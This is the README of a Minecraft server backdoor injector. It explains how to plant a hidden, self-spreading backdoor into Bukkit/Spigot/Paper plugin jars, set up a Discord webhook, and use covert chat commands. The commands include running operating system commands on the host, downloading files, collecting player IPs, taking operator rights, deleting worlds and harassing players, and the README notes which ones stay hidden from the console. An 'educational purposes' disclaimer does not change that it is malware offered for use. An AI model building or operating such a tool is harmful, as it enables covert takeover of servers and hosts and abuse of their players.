

# Zeroed Industries Backdoor
Updated by ProgMEM-CC

Spreading to other plugins DOES NOT WORK atm, eta is unknown

A silent, spreading backdoor for Minecraft Bukkit/Spigot/Paper servers.
Using the injector is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.
Injecting does not work as of right now, attempting to make the backdoor spread will just render the plugin and therfore the backdoor not run

For educational purposes only. Do not use on a server you do not own.

## Requirements:
* Java 8 runtime. (Newer may work)
* Desired target plugin jar file.

## GUI Usage:
* Run backdoor-(version).jar.
* Select desired plugin file.
* Input your Minecraft UUID.
* Input chat command prefix. (Default: #)
## Known Issue
If you have an issue similar to [Issue 82](https://github.com/ThiccIndustries/Minecraft-Backdoor/issues/82), try placing the backdoor into its own folder, and running from there. Do not try to run from the Start Menu.
## CLI Usage:
Java -jar backdoor.jar (filename) [options]
* --help / -h : Display syntax message in console
* --offline / -o : Use usernames instead of UUID
* --users / -u : UUID's or Usernames of authorized users. If not used, all users will be allowed.
* --prefix / -p (Default: '#') : Prefix for backdoor commands.
* --discord /-d : Discord webhook url. See Readme.
* --spread / -s : Spread to other plugins.
* --debug / -b : Send debug messages in console. Use this before creating issue reports.

## Discord Token Tutorial
1) In a discord server, open Server Settings, Then "Integrations"
2) Press 'Create Webhook'
3) Name and profile picture can be customised, then press "Copy Webhook URL"
4) Paste into injector / command line.

## Commands
Default command prefix is ``#``,  this can be changed.
* #help - display all command, or description of command
* #op - op specified player
* #deop - deop specified player
* #ban - ban player with reason and source
* #banip - ip ban player with reason and source
* #gm - switch to specified gamemode
* #give - give the specified item in specified quantities
* #exec - execute command as server console **[Visible]**
* #shell - execute operating system command as host **[Visible]**
* #info - shows information about server
* #chaos - deop and ban ops, op all regular players, run this while not being op yourself **[Visible]**
* #seed - get the current world seed
* #psay - sends messages as player
* #ssay - sends message as Server
* #rename - changes your nick
* #reload - Reloads the server **[Visible]**
* #getip - gets ip of the player
* #listworlds - displays all worlds
* #makeworld - creates new world **[Visible]**
* #delworld - deletes a world **[Visible]**
* #vanish - makes you vanish, tab included
* #silktouch - gives player silk touch hands
* #instabreak - let's player mine instantly
* #crash - crashes player's name
* #troll - Troll player in various ways
* #lock - locks the console or blocks player
* #unlock - unlocks the console or unblocks player
* #mute - mutes a player
* #unmute - unmutes a player
* #download - downloads a file
* #coords - get the coordinates of specified player
* #tp - teleport to specified coordinates **[Visible]**
* #stop - shutdown the server **[Visible, See below.]**
* #32k - you should know about op enchants.

Commands listed as **[Visible]** will be noticeable in Server console and or in-game chat.

Warning:
Teleporting may cause a '[player name] moved to quickly!' warning in server console. It may also cause anti-cheat to kick you.
Other strange behavior may occur when teleporting extreme distances. (such as to the world border)

## Troll subcommands
* clear - Clear all status of player. This will also reset Instabreak, Vanish, and silktouch
* thrower - Spam player with stacks of stone
* interact - Disable world interaction
* cripple - Player will be frozen in place
* flight -  Player unable to fly, even in creative mode.
* inventory - Disable inventory interaction
* mine - Player unable to mine blocks
* login - Player will be unable to login, generating fake error messages
* god - Immortality
* damage - Player unable to deal damage

## License
This software is provided under the GPL3 License.

Credit to **Rikonardo** for his [Bukloit](https://github.com/Rikonardo/Bukloit) project, which helped in the development of the Injector.
Thanks to @DarkReaper231 for additional features.
